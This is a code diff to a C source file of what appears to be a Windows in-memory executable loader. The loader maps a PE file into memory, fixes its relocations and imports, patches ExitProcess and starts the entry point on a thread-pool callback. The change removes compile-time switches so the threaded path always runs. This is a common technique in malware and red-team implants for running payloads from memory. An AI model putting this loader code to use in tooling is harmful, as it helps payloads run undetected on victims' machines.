@@ -3,7 +3,6 @@
 #include "../../includes/loader/loader.h"
 
 
-#ifdef LOAD_AND_LISTEN
 static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
     LdrMemContext *ctx = (LdrMemContext *)param;
     PVOID Base = ctx->BaseAddress;
@@ -24,7 +23,6 @@ static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
     ldr->win32->LocalFree(ctx);
     DBGA("[*] Cleaned up memory!\n");
 }
-#endif
 
 BOOL LdrMapExe(LdrTask info) {
 	DBGA("[+] Mapping exe into memory\n");
@@ -50,17 +48,11 @@ BOOL LdrMapExe(LdrTask info) {
 	LdrCopySections(BaseAddress, info.Data, sec, numSections);
 	LdrProcessRelocs(BaseAddress, info.Data);
 	LdrProcessIAT(BaseAddress, info.Data);
-#ifdef LOAD_AND_LISTEN
 	LdrPatchExitProcess();
-#endif
 	LdrSetSectionPerms(BaseAddress, sec, numSections);
 
 	ULONG_PTR entry = (ULONG_PTR)BaseAddress + pOpt->AddressOfEntryPoint;
 	
-#ifdef LOAD_AND_EXIT
-	DBGA("[*] Jumping to main\n");
-	((void(*)())entry)();
-#else
 	DBGA("[*] Starting Thread\n");
 	LdrMemContext* Addr = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrMemContext));
 	Addr->BaseAddress = BaseAddress;
@@ -75,7 +67,6 @@ BOOL LdrMapExe(LdrTask info) {
 	    INFINITE,            
 	    WT_EXECUTEONLYONCE
 	);
-#endif
 
 	return TRUE;
 }
